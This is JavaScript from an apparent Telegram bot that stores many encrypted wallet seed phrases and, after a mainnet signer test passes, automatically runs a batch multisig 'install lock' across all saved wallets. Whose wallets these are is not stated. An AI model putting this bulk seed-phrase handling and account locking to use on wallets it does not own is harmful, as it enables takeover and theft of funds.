    const phrase = decryptMultisigSignerPhrase(row);
    if (!phrase) {
        throw new Error("Signer Wallet tidak punya phrase tersimpan");
    }
    const keypair = deriveKeypairFromMnemonic(phrase);
    const publicKey = keypair.publicKey();
    if (row.public_key && String(row.public_key).trim() !== publicKey) {
        throw new Error("Phrase signer tidak cocok dengan public key tersimpan");
    }
    return { keypair, public_key: publicKey, signer_id: row.id, signer_name: row.name || "Signer Wallet" };
}

async function deleteMultisigSignerById(id) {
    const rows = await listMultisigSigners();
    const kept = rows.filter((row) => String(row.id || "") !== String(id || ""));
    await saveMultisigSigners(kept);
    return rows.length - kept.length;
}

async function deleteAllMultisigSigners() {
    const rows = await listMultisigSigners();
    await saveMultisigSigners([]);
    return rows.length;
}

function multisigSignerDeleteHash(row) {
    return crypto.createHash("sha1").update(`signer-wallet|${row.id || ""}|${row.public_key || ""}`).digest("hex").slice(0, 16);
}

async function listMultisigSavedWallets() {
    const rows = await loadData(MULTISIG_SAVED_WALLETS_KEY);
    return Array.isArray(rows) ? rows : [];
}

async function saveMultisigSavedWallets(rows) {
    await saveData(MULTISIG_SAVED_WALLETS_KEY, rows);
}

function decryptMultisigSavedWalletPhrase(row) {
    const decrypted = decryptMultisigPendingPayload(row?.encrypted_phrase || row?.phrase || row?.mnemonic);
    if (Array.isArray(decrypted)) {
        return String(decrypted[0] || "").trim();
    }
    return String(decrypted || "").trim();
}

async function getMultisigSavedWalletPhraseReport() {
    const rows = await listMultisigSavedWallets();
    const activeRows = rows.filter((row) => String(row.status || "saved") === "saved");
    const phrases = [];
    const unreadable = [];
    for (const row of activeRows) {
        try {
            const phrase = decryptMultisigSavedWalletPhrase(row);
            if (phrase) {
                phrases.push(phrase);
            } else {
                unreadable.push({ public_key: row.public_key, error: "Phrase kosong atau format lama tidak valid" });
            }
        } catch (err) {
            unreadable.push({ public_key: row.public_key, error: err.message || String(err) });
        }
    }
    return { total: activeRows.length, phrases, unreadable };
}

function publicMultisigSavedWallet(row) {
    return {
        id: row.id,
        public_key: row.public_key,
        status: row.status || "saved",
        created_at: row.created_at,
        updated_at: row.updated_at,
    };
}

async function upsertMultisigSavedWalletPhrase(phrase) {
    const text = String(phrase || "").trim();
    if (!text) {
        throw new Error("Phrase kosong");
    }
    const keypair = deriveKeypairFromMnemonic(text);
    const publicKey = keypair.publicKey();
    const rows = await listMultisigSavedWallets();
    const now = utcIso();
    const index = rows.findIndex((row) => String(row.public_key || "") === publicKey);
    const next = {
        ...(index >= 0 ? rows[index] : {}),
        id: index >= 0 ? rows[index].id : crypto.randomUUID(),
        public_key: publicKey,
        encrypted_phrase: encryptMultisigPendingPayload(text),
        status: "saved",
        created_at: rows[index]?.created_at || now,
        updated_at: now,
    };
    if (index >= 0) {
        rows[index] = next;
    } else {
        rows.push(next);
    }
    await saveMultisigSavedWallets(rows);
    return { action: index >= 0 ? "updated" : "added", row: publicMultisigSavedWallet(next) };
}

async function saveMultisigSavedWalletPhrases(inputText) {
    const lines = normalizeMultisigLines(inputText);
    const rows = await listMultisigSavedWallets();
    const indexByPublicKey = new Map(rows.map((row, index) => [String(row.public_key || ""), index]));
    const results = [];
    const now = utcIso();

    for (let index = 0; index < lines.length; index += 1) {
        try {
            const text = String(lines[index] || "").trim();
            if (!text) {
                throw new Error("Phrase kosong");
            }
            const keypair = deriveKeypairFromMnemonic(text);
            const publicKey = keypair.publicKey();
            const existingIndex = indexByPublicKey.has(publicKey) ? indexByPublicKey.get(publicKey) : -1;
            const next = {
                ...(existingIndex >= 0 ? rows[existingIndex] : {}),
                id: existingIndex >= 0 ? rows[existingIndex].id : crypto.randomUUID(),
                public_key: publicKey,
                encrypted_phrase: encryptMultisigPendingPayload(text),
                status: "saved",
                created_at: rows[existingIndex]?.created_at || now,
                updated_at: now,
            };
            if (existingIndex >= 0) {
                rows[existingIndex] = next;
            } else {
                indexByPublicKey.set(publicKey, rows.length);
                rows.push(next);
            }
            results.push({ line: index + 1, success: true, action: existingIndex >= 0 ? "updated" : "added", row: publicMultisigSavedWallet(next) });
        } catch (err) {
            results.push({ line: index + 1, success: false, error: err.message || String(err) });
        }
    }

    if (results.some((item) => item.success)) {
        await saveMultisigSavedWallets(rows);
    }

    return {
        total: lines.length,
        added: results.filter((item) => item.success && item.action === "added").length,
        updated: results.filter((item) => item.success && item.action === "updated").length,
        failed: results.filter((item) => !item.success).length,
        results,
    };
}

async function getMultisigSavedWalletPhrases() {
    const report = await getMultisigSavedWalletPhraseReport();
    if (report.unreadable.length) {
        const sample = report.unreadable.slice(0, 3).map((item) => {
            const key = String(item.public_key || "-");
            return `${key.slice(0, 8)}... ${item.error}`;
        }).join(" | ");
        const error = new Error(getMultisigEncryptedDataFriendlyMessage());
        error.code = "MULTISIG_DECRYPT_FAILED";
        error.unreadable_count = report.unreadable.length;
        error.total = report.total;
        throw error;
    }
    return report.phrases;
}

async function deleteMultisigSavedWalletByPublicKey(publicKey) {
    const key = String(publicKey || "").trim();
    const rows = await listMultisigSavedWallets();
    const kept = rows.filter((row) => String(row.public_key || "") !== key);
    await saveMultisigSavedWallets(kept);
    return rows.length - kept.length;
}

async function deleteAllMultisigSavedWallets() {
    const rows = await listMultisigSavedWallets();
    await saveMultisigSavedWallets([]);
    return rows.length;
}

function multisigSavedWalletDeleteHash(row) {
    return crypto.createHash("sha1").update(`saved-wallet|${row.public_key || ""}`).digest("hex").slice(0, 16);
}

function multisigSignerWatchDefaultState() {
    return {
        status: "idle",
        chat_id: "",
        test_public_key: "",
        encrypted_test_phrase: null,
        payload: null,
        interval_ms: MULTISIG_SIGNER_WATCH_INTERVAL_MS,
        attempts: 0,
        last_check_at: null,
        last_error: null,
        last_test_hash: null,
        active_run_id: null,
        status_message_id: null,
        status_chat_id: "",
        started_at: null,
        updated_at: null,
        completed_at: null,
        stopped_at: null,
    };
}

async function getMultisigSignerWatchState() {
    return loadJsonObject(MULTISIG_SIGNER_WATCH_KEY, multisigSignerWatchDefaultState());
}

async function saveMultisigSignerWatchState(patch = {}) {
    const current = await getMultisigSignerWatchState();
    const next = {
        ...current,
        ...patch,
        updated_at: utcIso(),
    };
    await saveJsonObject(MULTISIG_SIGNER_WATCH_KEY, next);
    return next;
}

function publicMultisigSignerWatchState(row = {}) {
    return {
        status: row.status || "idle",
        chat_id: row.chat_id || "",
        test_public_key: row.test_public_key || "",
        interval_ms: row.interval_ms || MULTISIG_SIGNER_WATCH_INTERVAL_MS,
        attempts: row.attempts || 0,
        last_check_at: row.last_check_at || null,
        last_error: row.last_error || null,
        last_test_hash: row.last_test_hash || null,
        active_run_id: row.active_run_id || null,
        status_message_id: row.status_message_id || null,
        status_chat_id: row.status_chat_id || "",
        started_at: row.started_at || null,
        updated_at: row.updated_at || null,
        completed_at: row.completed_at || null,
        stopped_at: row.stopped_at || null,
    };
}

function decryptMultisigSignerWatchTestPhrase(state) {
    const decrypted = decryptMultisigPendingPayload(state?.encrypted_test_phrase || null);
    if (Array.isArray(decrypted)) {
        return String(decrypted[0] || "").trim();
    }
    return String(decrypted || "").trim();
}

async function saveMultisigSignerWatchTestPhrase(inputText) {
    const lines = normalizeMultisigLines(inputText);
    if (lines.length !== 1) {
        throw new Error("Kirim tepat 1 phrase test signer saja. Jangan gabungkan dengan Saved Wallet List.");
    }
    const phrase = lines[0];
    const keypair = deriveKeypairFromMnemonic(phrase);
    const publicKey = keypair.publicKey();
    const next = await saveMultisigSignerWatchState({
        test_public_key: publicKey,
        encrypted_test_phrase: encryptMultisigPendingPayload(phrase),
        status: "idle",
        last_error: null,
        stopped_at: null,
    });
    return { public_key: publicKey, state: next };
}

function summarizeMultisigResultError(result) {
    const rows = Array.isArray(result?.results) ? result.results : [];
    const firstFailed = rows.find((item) => !item.success && !item.queued && !item.stopped);
    if (firstFailed?.error) {
        return firstFailed.error;
    }
    if (result?.error) {
        return result.error;
    }
    return "Signer mainnet belum aktif atau test wallet belum berhasil.";
}

let multisigSignerWatchTimer = null;
let multisigSignerWatchRunning = false;

async function stopMultisigSignerWatch(chatId = "", reason = "Dihentikan oleh admin") {
    const current = await getMultisigSignerWatchState();
    if (current.active_run_id && chatId) {
        requestTelegramMultisigRunStop(chatId, current.active_run_id);
    }
    return saveMultisigSignerWatchState({
        status: "stopped",
        active_run_id: current.active_run_id || null,
        stopped_at: utcIso(),
        last_error: reason,
    });
}

function signerWatchStopKeyboard(lang = {}) {
    return {
        inline_keyboard: [
            [{ text: lang.stopBatchInstallLock || "⛔ Stop Batch Install Lock", callback_data: "multi:watch:stop" }],
        ],
    };
}

function renderSignerWatchStatusText(state = {}, lang = {}) {
    const status = state.status || "idle";
    const lines = [
        `<b>${escapeTelegramHtml(lang.signerWatchTitle || "🔁 Watch Signer Mainnet")}</b>`,
        `${escapeTelegramHtml(lang.status || "Status")}: <b>${escapeTelegramHtml(formatTelegramStatus(status))}</b>`,
        `Test Wallet: <code>${escapeTelegramHtml(shortKey(state.test_public_key, 8))}</code>`,
        `Interval: <b>${Math.round(Number(state.interval_ms || MULTISIG_SIGNER_WATCH_INTERVAL_MS) / 1000)}s</b>`,
        `Attempts: <b>${escapeTelegramHtml(state.attempts || 0)}</b>`,
    ];
    if (state.last_check_at) lines.push(`Last Check: <code>${escapeTelegramHtml(state.last_check_at)}</code>`);
    if (state.last_error) {
        const label = String(state.status || "") === "error" ? "Info" : "Last Error";
        lines.push(`${label}: ${escapeTelegramHtml(state.last_error)}`);
    }
    if (state.last_test_hash) lines.push(`Test Hash: <code>${escapeTelegramHtml(shortKey(state.last_test_hash, 10))}</code>`);
    return lines.join("\n");
}

function getTelegramResponseMessageId(response) {
    const value = response?.result?.message_id ?? response?.message_id ?? null;
    const parsed = Number.parseInt(String(value || ""), 10);
    return Number.isSafeInteger(parsed) && parsed > 0 ? parsed : null;
}

function isTelegramMessageNotModifiedError(error) {
    const description = String(error?.response?.data?.description || error?.message || "").toLowerCase();
    return description.includes("message is not modified");
}

async function telegramEditMessageById(chatId, messageId, text, keyboard = null) {
    const numericMessageId = Number.parseInt(String(messageId || ""), 10);
    if (!chatId || !Number.isSafeInteger(numericMessageId) || numericMessageId <= 0) {
        throw new Error("Telegram message_id tidak valid untuk edit");
    }
    return telegramApi("editMessageText", {
        chat_id: chatId,
        message_id: numericMessageId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
        ...(keyboard ? { reply_markup: keyboard } : {}),
    });
}

function formatTelegramDurationShort(ms) {
    const totalSeconds = Math.max(0, Math.round(Number(ms || 0) / 1000));
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    if (hours > 0) return `${hours}h ${String(minutes).padStart(2, "0")}m ${String(seconds).padStart(2, "0")}s`;
    if (minutes > 0) return `${minutes}m ${String(seconds).padStart(2, "0")}s`;
    return `${seconds}s`;
}

function buildTelegramProgressBar(ratio, width = 10) {
    const clamped = Math.max(0, Math.min(1, Number(ratio || 0)));
    const filled = Math.round(clamped * width);
    return `${"█".repeat(filled)}${"░".repeat(Math.max(0, width - filled))}`;
}

function renderTelegramLoadingText(options = {}) {
    const lang = options.lang || {};
    const frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"];
    const frame = frames[Number(options.frameIndex || 0) % frames.length];
    const title = String(options.title || "⏳ Processing...");
    const subtitle = String(options.subtitle || lang.loadingKeepOpen || "Please wait...");
    const startedAt = Number(options.startedAt || Date.now());
    const elapsedMs = Math.max(0, Date.now() - startedAt);
    const estimateMs = Math.max(0, Number(options.estimateMs || 0));
    const hasManualProgress = options.progressRatio !== null && options.progressRatio !== undefined;
    let progressRatio = hasManualProgress
        ? Math.max(0, Math.min(1, Number(options.progressRatio || 0)))
        : (estimateMs > 0 ? Math.max(0, Math.min(0.95, elapsedMs / estimateMs)) : null);
    const etaText = estimateMs > 0
        ? (!hasManualProgress && elapsedMs >= estimateMs
            ? (lang.loadingStillRunning || "still scanning...")
            : formatTelegramDurationShort(Math.max(0, estimateMs - elapsedMs)))
        : (lang.loadingUnknown || "calculating...");
    const lines = [
        `<b>${escapeTelegramHtml(title)}</b>`,
        `<code>${escapeTelegramHtml(frame)} ${progressRatio === null ? "──────────" : buildTelegramProgressBar(progressRatio, 10)}</code>${progressRatio === null ? "" : ` <b>${Math.round(progressRatio * 100)}%</b>`}`,
        `${escapeTelegramHtml(lang.loadingElapsed || "Elapsed")}: <b>${escapeTelegramHtml(formatTelegramDurationShort(elapsedMs))}</b>`,
        `${escapeTelegramHtml(lang.loadingEta || "Estimated remaining")}: <b>${escapeTelegramHtml(etaText)}</b>`,
    ];
    if (subtitle) lines.push("", `${escapeTelegramHtml(subtitle)}`);
    if (options.bodyHtml) lines.push("", String(options.bodyHtml));
    return lines.join("\n");
}

async function createTelegramLoadingSession({ chatId = "", callbackQuery = null, lang = {}, title = "", subtitle = "", keyboard = null, estimateMs = 0, progressRatio = null } = {}) {
    const targetChatId = String(chatId || callbackQuery?.message?.chat?.id || "");
    const sessionQuery = callbackQuery || { message: { chat: { id: targetChatId }, message_id: null } };
    const state = {
        frameIndex: 0,
        startedAt: Date.now(),
        estimateMs,
        progressRatio,
        title,
        subtitle,
        keyboard,
        bodyHtml: "",
        lastText: "",
    };
    let stopped = false;
    let timer = null;

    const render = () => renderTelegramLoadingText({ ...state, lang });

    const push = async (force = false) => {
        if (stopped) return;
        const text = render();
        if (!force && text === state.lastText) return;
        state.lastText = text;
        if (sessionQuery?.message?.message_id) {
            await telegramEditOrSend(sessionQuery, text, state.keyboard);
        } else {
            const sent = await telegramSend(targetChatId, text, state.keyboard);
            const messageId = getTelegramResponseMessageId(sent);
            if (messageId) {
                sessionQuery.message = { chat: { id: targetChatId }, message_id: messageId };
            }
        }
    };

    const loop = () => {
        timer = setTimeout(async () => {
            if (stopped) return;
            state.frameIndex = (state.frameIndex + 1) % 10;
            await push(false).catch(() => null);
            loop();
        }, 1000);
    };

    await push(true);
    loop();

    return {
        callbackQuery: sessionQuery,
        async update(patch = {}) {
            Object.assign(state, patch || {});
            state.frameIndex = (state.frameIndex + 1) % 10;
            await push(true);
        },
        async stop(finalText = null, finalKeyboard = null) {
            stopped = true;
            if (timer) clearTimeout(timer);
            if (finalText) {
                if (sessionQuery?.message?.message_id) {
                    return telegramEditOrSend(sessionQuery, finalText, finalKeyboard ?? state.keyboard);
                }
                return telegramSend(targetChatId, finalText, finalKeyboard ?? state.keyboard);
            }
            return null;
        },
    };
}

async function updateSignerWatchStatusMessage(chatId, state = {}, lang = {}, options = {}) {
    const keyboard = options.keyboard || signerWatchStopKeyboard(lang);
    const text = options.text || renderSignerWatchStatusText(state, lang);
    const callbackQuery = options.callbackQuery || null;
    const callbackMessage = callbackQuery?.message || null;
    const targetChatId = String(
        chatId ||
        callbackMessage?.chat?.id ||
        state.status_chat_id ||
        state.chat_id ||
        ""
    );
    const preferredMessageId = Number.parseInt(String(
        options.message_id ||
        callbackMessage?.message_id ||
        state.status_message_id ||
        ""
    ), 10);

    if (callbackQuery?.__auto_clean_message && targetChatId && Number.isSafeInteger(preferredMessageId) && preferredMessageId > 0) {
        await cleanupTelegramUiMessages(targetChatId, preferredMessageId);
        const deleted = await telegramDeleteMessageSafe(targetChatId, preferredMessageId);
        forgetTelegramUiMessage(targetChatId, preferredMessageId);
        callbackQuery.__auto_clean_message = false;
        if (deleted) {
            const response = await telegramSend(targetChatId, text, keyboard);
            const messageId = getTelegramResponseMessageId(response);
            if (messageId) {
                updateCallbackQueryMessageId(callbackQuery, messageId);
                await saveMultisigSignerWatchState({ status_chat_id: targetChatId, status_message_id: messageId });
            }
            return { chat_id: targetChatId, message_id: messageId, edited: false, deleted_previous: true };
        }
    }

    if (targetChatId && Number.isSafeInteger(preferredMessageId) && preferredMessageId > 0) {
        try {
            await telegramEditMessageById(targetChatId, preferredMessageId, text, keyboard);
            rememberTelegramUiMessage(targetChatId, preferredMessageId);
            if (String(state.status_chat_id || "") !== targetChatId || Number(state.status_message_id || 0) !== preferredMessageId) {
                await saveMultisigSignerWatchState({ status_chat_id: targetChatId, status_message_id: preferredMessageId });
            }
            return { chat_id: targetChatId, message_id: preferredMessageId, edited: true };
        } catch (err) {
            if (isTelegramMessageNotModifiedError(err)) {
                return { chat_id: targetChatId, message_id: preferredMessageId, edited: false, unchanged: true };
            }
            // Jika pesan lama tidak bisa diedit, kirim satu pesan status baru dan simpan message_id baru.
        }
    }

    const response = await telegramSend(targetChatId, text, keyboard);
    const messageId = getTelegramResponseMessageId(response);
    if (messageId) {
        await saveMultisigSignerWatchState({ status_chat_id: targetChatId, status_message_id: messageId });
    }
    return { chat_id: targetChatId, message_id: messageId, edited: false };
}

async function runMultisigSignerWatchAutoInstall(state) {
    const chatId = state.chat_id;
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const savedPhrases = await getMultisigSavedWalletPhrases();
    if (!savedPhrases.length) {
        await saveMultisigSignerWatchState({ status: "error", active_run_id: null, last_error: tgLang.savedWalletRunEmpty || "Saved Wallet List kosong" });
        return telegramSend(chatId, tgLang.savedWalletRunEmpty || "Saved Wallet List kosong", telegramBackKeyboard("menu:multisig"));
    }

    const payload = {
        ...(state.payload || {}),
        mode: "install_lock",
        target_source: "saved_list",
        target_phrases: savedPhrases.join("\n"),
        skip_protocol_wait: true,
    };
    const runControl = createTelegramMultisigRun(chatId);
    await saveMultisigSignerWatchState({
        status: "running_batch",
        active_run_id: runControl.id,
        last_error: null,
    });

    let lastProgressText = "";
    let lastProgressEditAt = 0;
    const sendProgress = async (progress = {}, force = false) => {
        const text = renderMultisigRunProgressText(progress, tgLang, true);
        const now = Date.now();
        if (!force && text === lastProgressText) return;
        if (!force && now - lastProgressEditAt < 1500) return;
        lastProgressText = text;
        lastProgressEditAt = now;
        const currentState = await getMultisigSignerWatchState().catch(() => state);
        await updateSignerWatchStatusMessage(chatId, currentState, tgLang, {
            text,
            keyboard: telegramMultisigRunKeyboard(runControl.id, tgLang),
        });
    };

    try {
        await updateSignerWatchStatusMessage(
            chatId,
            await getMultisigSignerWatchState(),
            tgLang,
            {
                text: tgLang.signerWatchSignerReadyAutoRun || "✅ Signer mainnet sudah aktif. Bot menjalankan Install Lock otomatis dari Saved Wallet List.",
                keyboard: telegramMultisigRunKeyboard(runControl.id, tgLang),
            }
        );
        await sendProgress({ stage: "starting", total: savedPhrases.length, batch_mode: "parallel_isolated_wallet" }, true);
        payload.on_progress = (progress) => sendProgress(progress, false);
        payload.should_stop = () => isTelegramMultisigRunStopRequested(runControl.id);
        const result = await executeMultisigInstallLock(payload);
        await sendProgress({
            stage: result.stopped ? "stopped" : "completed",
            total: result.total,
            valid: result.success_count,
            success: result.success_count,
            failed: result.failed_count ?? (Array.isArray(result.results) ? result.results.filter((item) => !item.success && !item.queued && !item.stopped).length : 0),
            stopped: result.stopped_count,
            batch_count: result.batch_count,
        }, true);
        await saveMultisigSignerWatchState({
            status: result.stopped ? "stopped" : "completed",
            active_run_id: null,
            completed_at: result.stopped ? null : utcIso(),
            stopped_at: result.stopped ? utcIso() : null,
            last_error: result.stopped ? "Batch dihentikan oleh admin" : null,
        });
        const title = result.stopped ? (tgLang.multisigRunStopped || "Batch dihentikan") : (tgLang.multisigDone || "Multisig selesai");
        return telegramSend(chatId, renderMultisigResultText(result, title), telegramBackKeyboard("menu:multisig"));
    } catch (err) {
        const safeError = normalizeMultisigErrorForTelegram(err);
        const errorState = await saveMultisigSignerWatchState({ status: "error", active_run_id: null, last_error: safeError });
        await updateSignerWatchStatusMessage(chatId, errorState, tgLang, {
            text: `❌ ${escapeTelegramHtml(safeError)}`,
            keyboard: telegramBackKeyboard("menu:multisig"),
        });
        return null;
    } finally {
        finishTelegramMultisigRun(runControl.id);
    }
}

async function processMultisigSignerWatchOnce() {
    if (multisigSignerWatchRunning || !redisClient.isOpen) {
        return;
    }
    multisigSignerWatchRunning = true;
    try {
        const state = await getMultisigSignerWatchState();
        if (String(state.status || "") !== "watching") {
            return;
        }
        const chatId = state.chat_id;
        if (!chatId) {
            await saveMultisigSignerWatchState({ status: "error", last_error: "Chat ID kosong" });
            return;
        }
        const testPhrase = decryptMultisigSignerWatchTestPhrase(state);
        if (!testPhrase) {
            await saveMultisigSignerWatchState({ status: "error", last_error: "Test phrase signer belum diset" });
            return;
        }
        const attempts = Number(state.attempts || 0) + 1;
        let updatedState = await saveMultisigSignerWatchState({ attempts, last_check_at: utcIso(), last_error: null });
        const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
        await updateSignerWatchStatusMessage(chatId, updatedState, tgLang);

        const testPayload = {
            ...(state.payload || {}),
            mode: "install_lock",
            target_source: "signer_test_phrase",
            target_phrases: testPhrase,
            batch_size: 1,
            batch_delay_ms: 0,
            skip_protocol_wait: true,
        };
        const result = await executeMultisigInstallLock(testPayload);
        if (Number(result.success_count || 0) > 0) {
            const hash = (Array.isArray(result.results) ? result.results.find((item) => item.success && item.hash)?.hash : null) || null;
            const readyState = await saveMultisigSignerWatchState({
                status: "signer_ready",
                last_test_hash: hash,
                last_error: null,
            });
            await runMultisigSignerWatchAutoInstall({ ...readyState, status: "signer_ready" });
            return;
        }
        const errorMessage = summarizeMultisigResultError(result);
        updatedState = await saveMultisigSignerWatchState({
            status: "watching",
            last_error: errorMessage,
            last_check_at: utcIso(),
        });
        await updateSignerWatchStatusMessage(chatId, updatedState, tgLang);
    } catch (err) {
        const state = await getMultisigSignerWatchState().catch(() => ({}));
        const safeError = normalizeMultisigErrorForTelegram(err);
        const nextStatus = isMultisigDecryptError(err) ? "error" : "watching";
        const errorState = await saveMultisigSignerWatchState({
            status: nextStatus,
            active_run_id: null,
            last_error: safeError,
            last_check_at: utcIso(),
            stopped_at: isMultisigDecryptError(err) ? utcIso() : state.stopped_at || null,
        });
        if (state.chat_id) {
            try {
                const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
                await updateSignerWatchStatusMessage(state.chat_id, errorState, tgLang, {
                    keyboard: isMultisigDecryptError(err) ? telegramBackKeyboard("menu:multisig") : undefined,
                });
            } catch (_err) {
                // Ignore Telegram notification failure in watcher loop.
            }
        }
    } finally {
        multisigSignerWatchRunning = false;
    }
}

function startMultisigSignerWatchRuntime() {
    if (multisigSignerWatchTimer) {
        return;
    }
    setTimeout(() => processMultisigSignerWatchOnce().catch((err) => console.log(`Multisig signer watch error: ${err.message}`)), 5000);
    multisigSignerWatchTimer = setInterval(() => {
        processMultisigSignerWatchOnce().catch((err) => console.log(`Multisig signer watch error: ${err.message}`));
    }, MULTISIG_SIGNER_WATCH_INTERVAL_MS);
}

async function startMultisigSignerWatchFromWizard(chatId, callbackQuery = null, state = null) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    state = state || getMultisigWizard(chatId);
    if (!state) {
        return startMultisigSignerWatchWizard(chatId, callbackQuery);
    }
    const testState = await getMultisigSignerWatchState();
    if (!testState.encrypted_test_phrase || !testState.test_public_key) {
        return promptMultisigSignerWatchTestPhrase(chatId, callbackQuery, true);
    }
    let savedPhrases = [];
    try {
        savedPhrases = await getMultisigSavedWalletPhrases();
    } catch (err) {
        const safeError = normalizeMultisigErrorForTelegram(err);
        await saveMultisigSignerWatchState({ status: "error", last_error: safeError, active_run_id: null, stopped_at: utcIso() });
        return telegramEditOrSend(callbackQuery, `❌ ${escapeTelegramHtml(safeError)}`, telegramBackKeyboard("menu:multisig"));
    }
    if (!savedPhrases.length) {
        return telegramEditOrSend(callbackQuery, tgLang.savedWalletRunEmpty || "Saved Wallet List kosong", telegramBackKeyboard("menu:multisig"));
    }
    state.data.target_phrases = savedPhrases.join("\n");
    state.data.target_source = "saved_list";
    const payload = buildMultisigPayload(state.data);
    const storedPayload = {
        ...payload,
        target_phrases: "",
        target_source: "saved_list",
        skip_protocol_wait: true,
    };
    const next = await saveMultisigSignerWatchState({
        status: "watching",
        chat_id: String(chatId || ""),
        payload: storedPayload,
        interval_ms: MULTISIG_SIGNER_WATCH_INTERVAL_MS,
        attempts: 0,
        last_error: null,
        last_check_at: null,
        active_run_id: null,
        status_message_id: callbackQuery?.message?.message_id || null,
        status_chat_id: String(chatId || ""),
        started_at: utcIso(),
        stopped_at: null,
        completed_at: null,
    });
    telegramControlState.pendingInputs.delete(String(chatId));
    await updateSignerWatchStatusMessage(chatId, next, tgLang, { callbackQuery });
    processMultisigSignerWatchOnce().catch((err) => console.log(`Multisig signer watch immediate error: ${err.message}`));
}

async function startMultisigSignerWatchWizard(chatId, editQuery = null) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const testState = await getMultisigSignerWatchState();
    if (!testState.encrypted_test_phrase || !testState.test_public_key) {
        return promptMultisigSignerWatchTestPhrase(chatId, editQuery, true);
    }
    const savedWallets = await listMultisigSavedWallets();
    if (!savedWallets.length) {
        return editQuery
            ? telegramEditOrSend(editQuery, tgLang.savedWalletRunEmpty || "Saved Wallet List kosong", telegramBackKeyboard("menu:multisig"))
            : telegramSend(chatId, tgLang.savedWalletRunEmpty || "Saved Wallet List kosong", telegramBackKeyboard("menu:multisig"));
    }
    const data = await defaultMultisigData();
    data.mode = "install_lock";
    data.network = "mainnet";
    data.target_source = "saved_list";
    data.watch_signer_auto = true;
    data.target_label = `${savedWallets.length} saved wallet`;
    const state = { action: "multi_wizard", step: "network", data, created_at: Date.now() };
    saveMultisigWizard(chatId, state);
    return renderMultisigNetworkPicker(chatId, editQuery, state);
}

async function promptMultisigSignerWatchTestPhrase(chatId, editQuery = null, startAfterSave = false) {
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    const prompt = tgLang.signerWatchTestPhrasePrompt || "Kirim 1 phrase khusus untuk test signer mainnet. Phrase ini terpisah dari Saved Wallet List.";
    telegramControlState.pendingInputs.set(String(chatId), {
        action: "multi_signer_test_phrase",
        data: { start_after_save: Boolean(startAfterSave) },
        created_at: Date.now(),
    });
    const keyboard = telegramBackKeyboard("menu:multisig");
    return editQuery ? telegramEditOrSend(editQuery, prompt, keyboard) : telegramSend(chatId, prompt, keyboard);
}

async function handleMultisigSignerWatchTestPhraseInput(message, pending = {}) {
    const chatId = message.chat.id;
    const { lang: tgLang } = await getCurrentTelegramLanguageBundle();
    try {
        const input = await readTelegramTargetInputText(message, { step: "signer_test_phrase" }, tgLang);
        const saved = await saveMultisigSignerWatchTestPhrase(input.text);
        await telegramDeleteUserMessage(message);
        telegramControlState.pendingInputs.delete(String(chatId));
        await telegramSend(chatId, `${tgLang.signerWatchTestPhraseSaved || "✅ Test phrase signer disimpan"}\nTest Wallet: <code>${escapeTelegramHtml(shortKey(saved.public_key, 8))}</code>`, telegramBackKeyboard("menu:multisig"));
        if (pending.data?.start_after_save) {
            return startMultisigSignerWatchWizard(chatId);
        }
        return renderTelegramMultisig(chatId);
    } catch (err) {
        return telegramSend(chatId, `❌ ${escapeTelegramHtml(err.message || err)}`, telegramBackKeyboard("menu:multisig"));
    }
}

function parseProtocolVersionValue(value) {
    const parsed = Number.parseInt(String(value ?? ""), 10);
    return Number.isSafeInteger(parsed) ? parsed : null;
}

async function fetchMultisigProtocolInfo(horizonUrl, requiredProtocolVersion = MULTISIG_REQUIRED_PROTOCOL_VERSION) {
    const normalizedUrl = normalizeServerUrl(horizonUrl);
    const checkedAt = utcIso();
    try {
        const response = await axios.get(normalizedUrl, { timeout: 8000 });
        const data = response.data || {};
        const current = parseProtocolVersionValue(data.current_protocol_version);
        const supported = parseProtocolVersionValue(data.supported_protocol_version);
        const core = parseProtocolVersionValue(data.core_supported_protocol_version);
        const currentForReady = current ?? Math.max(0, supported || 0, core || 0);
        return {
            ready: currentForReady >= requiredProtocolVersion,
            required_protocol_version: requiredProtocolVersion,
            current_protocol_version: current,
            supported_protocol_version: supported,
            core_supported_protocol_version: core,
            horizon_url: normalizedUrl,
            checked_at: checkedAt,
            raw: {
                network_passphrase: data.network_passphrase || null,
                current_protocol_version: data.current_protocol_version ?? null,
                supported_protocol_version: data.supported_protocol_version ?? null,
                core_supported_protocol_version: data.core_supported_protocol_version ?? null,
            },
        };
    } catch (err) {
        return {
            ready: false,
            required_protocol_version: requiredProtocolVersion,
            current_protocol_version: null,
            supported_protocol_version: null,
            core_supported_protocol_version: null,
            horizon_url: normalizedUrl,
            checked_at: checkedAt,
            error: err.message || String(err),
        };
    }
}

async function listMultisigPendingLocks() {
    const rows = await loadData(MULTISIG_PENDING_LOCKS_KEY);
    return Array.isArray(rows) ? rows : [];
}

async function saveMultisigPendingLocks(rows) {
    await saveData(MULTISIG_PENDING_LOCKS_KEY, rows);
}

function publicMultisigPendingLock(row) {
    return {
        id: row.id,
        status: row.status,
        network: row.network,
        horizon_url: row.horizon_url || null,
        horizon_urls: Array.isArray(row.horizon_urls) ? row.horizon_urls : [],
        horizon_server_id: row.horizon_server_id || null,
        notified_protocol_26_at: row.notified_protocol_26_at || null,
        funding_public_key: row.funding_public_key,
        funding_wallet_id: row.funding_wallet_id,
        funding_wallet_name: row.funding_wallet_name,
        signer_public_key: row.signer_public_key || row.funding_public_key,
        signer_wallet_id: row.signer_wallet_id || row.signer_id || null,
        signer_wallet_name: row.signer_wallet_name || null,
        target_count: row.target_count,
        target_public_keys: row.target_public_keys || [],
        required_protocol_version: row.required_protocol_version || MULTISIG_REQUIRED_PROTOCOL_VERSION,
        current_protocol_version: row.current_protocol_version ?? null,
        last_error: row.last_error || null,
        last_hash: row.last_hash || null,
        success_count: row.success_count ?? null,
        created_at: row.created_at,
        updated_at: row.updated_at,
        last_checked_at: row.last_checked_at || null,
        completed_at: row.completed_at || null,
    };
}

async function updateMultisigPendingLock(id, patch) {
    const rows = await listMultisigPendingLocks();
    const index = rows.findIndex((row) => row.id === id);
